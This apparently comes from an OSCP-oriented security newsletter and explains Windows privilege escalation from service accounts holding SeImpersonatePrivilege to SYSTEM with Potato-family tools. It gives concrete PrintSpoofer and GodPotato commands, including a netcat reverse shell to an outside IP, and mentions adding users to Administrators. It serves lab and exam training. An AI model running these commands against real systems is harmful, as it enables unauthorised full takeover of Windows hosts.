### Content of the Day — Windows Privesc: SeImpersonatePrivilege → SYSTEM (the Potato family)

You've landed a shell on a Windows box — webshell as `iis apppool\web`, xp_cmdshell as the MSSQL service account, or a service running as `NETWORK SERVICE` / `LOCAL SERVICE`. First move, every time: `whoami /priv`. If **`SeImpersonatePrivilege`** (or `SeAssignPrimaryTokenPrivilege`) shows **Enabled**, you are one hop from SYSTEM. Service accounts hold this privilege by default, which is exactly why this pattern is everywhere. Mechanically, `SeImpersonate` lets your process assume the security token of any client that authenticates to it — so the whole game is *coercing a SYSTEM-level process into authenticating to an endpoint you control*, then impersonating the token it hands over and spawning a process with it. This is **MITRE ATT&CK T1134.001** (Access Token Manipulation: Token Impersonation/Theft).

The tooling is a lineage of the same trick. **JuicyPotato** (DCOM/BITS + local NTLM reflection, pick-your-CLSID) was the classic until Microsoft killed local reflection on Server 2019 / Win10 1809+. **RoguePotato** revived it by redirecting the OXID resolver to a remote resolver on 135. **PrintSpoofer** sidesteps all of that by abusing the Print Spooler (MS-RPRN) to make SYSTEM connect to a named pipe you own — clean and reliable *as long as Spooler is running*. Post-PrintNightmare that's often disabled, which is why **GodPotato** is today's default: it abuses generic DCOM/RPC activation, needs no Spooler, and works across Server 2012→2022 and Win8→11. Round it out with **EfsPotato / SharpEfsPotato** (MS-EFSR coercion, PetitPotam's local cousin) when you want another activation path.

Concretely, once you confirm the privilege: PrintSpoofer is `PrintSpoofer.exe -i -c cmd` (or `-c "nc.exe 10.10.14.5 443 -e cmd"` for a SYSTEM reverse shell). GodPotato just needs the right runtime binary — `GodPotato-NET4.exe -cmd "cmd /c whoami"` should return `nt authority\system`; swap in a Netcat/`msfvenom` one-liner or add your user to Administrators from there. If Spooler's down and DCOM's your only option, GodPotato is the first thing to reach for; keep RoguePotato in your back pocket for the constrained cases where you can stand up a 135 redirector.

**OSCP/lab tie-in:** this is arguably *the* highest-yield Windows local-privesc pattern in the OSCP/PG Windows set. The canonical flow — web foothold → shell as a service account → `whoami /priv` shows `SeImpersonate` → Potato → SYSTEM — recurs constantly on HTB and Proving Grounds Windows targets. Drill it until it's muscle memory: the enumeration step is one command, and the exploitation step is one binary.

### One Thing to Try

On any Windows foothold run `whoami /priv` — if `SeImpersonatePrivilege` is **Enabled**, drop `GodPotato-NET4.exe -cmd "cmd /c whoami"` (or `PrintSpoofer.exe -i -c cmd` if the Spooler's alive) and confirm you're `nt authority\system`.
